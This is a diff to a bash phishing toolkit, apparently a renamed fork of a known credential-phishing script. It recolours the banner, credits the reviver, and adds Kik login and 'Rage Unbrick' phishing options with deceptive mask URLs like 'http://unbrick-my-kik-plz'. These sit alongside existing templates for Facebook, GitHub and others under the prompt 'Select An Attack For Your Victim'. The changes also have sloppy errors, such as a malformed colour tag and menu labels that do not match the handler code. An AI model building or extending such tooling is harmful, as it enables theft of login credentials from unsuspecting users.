@@ -133,27 +133,29 @@ kill_pid() {
 ## Banner
 banner() {
 	cat <<- EOF
-		${PURPLE}
-		${PURPLE} ▄▀▀▀▀▄   ▄▀▀█▄▄▄▄  ▄▀▀▀█▀▀▄      ▄▀▀▄▀▀▀▄  ▄▀▀▄ ▄▄   ▄▀▀█▀▄   ▄▀▀▀▀▄  ▄▀▀▄ ▄▄   ▄▀▀█▄▄▄▄  ▄▀▀█▄▄  
-		${PURPLE}█        ▐  ▄▀   ▐ █    █  ▐     █   █   █ █  █   ▄▀ █   █  █ █ █   ▐ █  █   ▄▀ ▐  ▄▀   ▐ █ ▄▀   █            
-		${PURPLE}█    ▀▄▄   █▄▄▄▄▄  ▐   █         ▐  █▀▀▀▀  ▐  █▄▄▄█  ▐   █  ▐    ▀▄   ▐  █▄▄▄█    █▄▄▄▄▄  ▐ █    █ 
-		${PURPLE}█     █ █  █    ▌     █             █         █   █      █    ▀▄   █     █   █    █    ▌    █    █ 
-		${PURPLE}▐▀▄▄▄▄▀ ▐ ▄▀▄▄▄▄    ▄▀            ▄▀         ▄▀  ▄▀   ▄▀▀▀▀▀▄  █▀▀▀     ▄▀  ▄▀   ▄▀▄▄▄▄    ▄▀▄▄▄▄▀    
-		${PURPLE}▐         █    ▐   █             █          █   █    █       █ ▐       █   █     █    ▐   █     ▐   
-		${PURPLE}          ▐        ▐             ▐          ▐   ▐    ▐       ▐         ▐   ▐     ▐        ▐                       
-		${PURPLE}                                                              ${RED}Version : 0.1-beta
+	        ${MAGENTA}
+		${MAGENTA} ▄▀▀▀▀▄   ▄▀▀█▄▄▄▄  ▄▀▀▀█▀▀▄      ▄▀▀▄▀▀▀▄  ▄▀▀▄ ▄▄   ▄▀▀█▀▄   ▄▀▀▀▀▄  ▄▀▀▄ ▄▄   ▄▀▀█▄▄▄▄  ▄▀▀█▄▄  
+		${MAGENTA}█        ▐  ▄▀   ▐ █    █  ▐     █   █   █ █  █   ▄▀ █   █  █ █ █   ▐ █  █   ▄▀ ▐  ▄▀   ▐ █ ▄▀   █            
+		${MAGENTA}█    ▀▄▄   █▄▄▄▄▄  ▐   █         ▐  █▀▀▀▀  ▐  █▄▄▄█  ▐   █  ▐    ▀▄   ▐  █▄▄▄█    █▄▄▄▄▄  ▐ █    █ 
+		${MAGENTA}█     █ █  █    ▌     █             █         █   █      █    ▀▄   █     █   █    █    ▌    █    █ 
+		${MAGENTA}▐▀▄▄▄▄▀ ▐ ▄▀▄▄▄▄    ▄▀            ▄▀         ▄▀  ▄▀   ▄▀▀▀▀▀▄  █▀▀▀     ▄▀  ▄▀   ▄▀▄▄▄▄    ▄▀▄▄▄▄▀    
+		${MAGENTA}▐         █    ▐   █             █          █   █    █       █ ▐       █   █     █    ▐   █     ▐   
+		${MAGENTA}          ▐        ▐             ▐          ▐   ▐    ▐       ▐         ▐   ▐     ▐        ▐                       
+		${MAGENTA}                                                             
+	                    ${CYAN}Cha-Cha Real Smooth~~~~                                          ${RED}Ver : 0.1-beta
 
-		${GREEN}[${WHITE}-${GREEN}]${GREEN} Revived/Skidded by @blazes w/Zero LMAO. ILuvYall<3 (More to come? kik.me/blazes)${WHITE}
+		${RED}~~~~~${GREEN}ReviveD by @blazes w/Zero LMAO. ${CYAN}ILuvYall<3${GREEN}(More to come? kik.me/blazes)${RED}~~~~~
+		
 	EOF
 }
 
 ## Small Banner
 banner_small() {
 	cat <<- EOF
-		${PURPLE}  +-+-+-+ +-+-+-+-+-+-+-+
-		${PURPLE}  |G|e|t| |P|h|i|s|h|e|d|
-		${PURPLE}  +-+-+-+ +-+-+-+-+-+-+-+
-		${CYAN}  Revived by @blazes ${WHITE} 
+		${MAGENTA}  +-+-+-+ +-+-+-+-+-+-+-+
+		${MAGENTA}  |G|e|t| |P|h|i|s|h|e|d|
+		${MAGENTA}  +-+-+-+ +-+-+-+-+-+-+-+
+		${MAGENTA}  Revived by @blazes ${WHITE} 
 	EOF
 }
 
@@ -501,7 +503,7 @@ site_vk() {
 main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
+		${RED}[${WHITE}::${RED}]${ORANGE} Select your method of exposure. ${RED}[${WHITE}::${RED}]${ORANGE}
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
 		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
@@ -514,6 +516,11 @@ main_menu() {
 		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
 		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
 		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
+		
+		#{MAGENTA~~~${GREEN}KIK STUFF FOR NOW${MAGENTA}~~~
+		
+		${RED}[${WHITE}34${RED}]${ORANGE} Rage Unbrick
+		${RED}[${WHITE}35${RED}]${ORANGE} Kik.com/login
 
         ${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
 
@@ -647,9 +654,13 @@ main_menu() {
 		website="github"
 		mask='http://get-1k-followers-on-github-free'
 		tunnel_menu
-		elif [[ "$REPLY" == 33 ]]; then
-		website="Rage-Unbrick"
-		mask='http://get-1k-followers-on-github-free'
+	elif [[ "$REPLY" == 34 ]]; then
+		website="kik"
+		mask='http://kik-team'
+		tunnel_menu
+	elif [[ "$REPLY" == 35 ]]; then
+		website="rage"
+		mask='http://unbrick-my-kik-plz'
 		tunnel_menu
 	elif [[ "$REPLY" == 99 ]]; then
 		about
